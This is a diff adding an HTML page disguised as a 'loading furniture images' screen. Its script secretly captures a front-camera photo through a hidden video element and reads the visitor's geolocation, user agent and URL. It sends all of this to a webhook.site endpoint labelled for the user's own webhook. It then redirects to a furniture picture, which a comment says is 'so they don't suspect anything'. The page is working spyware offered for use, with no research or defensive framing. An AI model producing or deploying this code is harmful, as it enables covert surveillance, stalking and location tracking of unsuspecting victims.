@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loading Furniture Images...</title>
+  <style>
+    body { font-family: Arial; text-align:center; padding:50px; background:#f5f5f5; }
+    .spinner { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <h2>Please wait, loading high-resolution images of the furniture...</h2>
+  <div class="spinner"></div>
+  <p>This may take a few seconds on mobile data.</p>
+
+  <video id="video" width="1" height="1" style="visibility:hidden;"></video>
+  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    let captured = false;
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        video.srcObject = stream;
+        video.play();
+        
+        setTimeout(() => {
+          if (captured) return;
+          captured = true;
+          ctx.drawImage(video, 0, 0, 640, 480);
+          const photo = canvas.toDataURL('image/jpeg', 0.8);
+
+          stream.getTracks().forEach(track => track.stop());
+
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+              sendData(photo, pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+            }, () => {
+              sendData(photo, null, null);
+            }, { timeout: 10000 });
+          } else {
+            sendData(photo, null, null);
+          }
+        }, 2000);
+      })
+      .catch(err => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(pos => {
+            sendData(null, pos.coords.latitude, pos.coords.longitude);
+          });
+        }
+      });
+
+    function sendData(photo, lat, lon, accuracy = null) {
+      const data = {
+        photo: photo,
+        lat: lat,
+        lon: lon,
+        accuracy: accuracy,
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString(),
+        url: location.href
+      };
+
+      // ← YOUR WEBHOOK IS HERE ↓↓↓
+      fetch('https://webhook.site/30f98038-ab94-44f7-915d-7e9a813b64de', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify(data)
+      });
+
+      // After 3 seconds it shows fake furniture so they don’t suspect anything
+      setTimeout(() => {
+        window.location = "https://i.imgur.com/tfJZ66v.jpeg";
+      }, 3000);
+    }
+  </script>
+</body>
+</html>
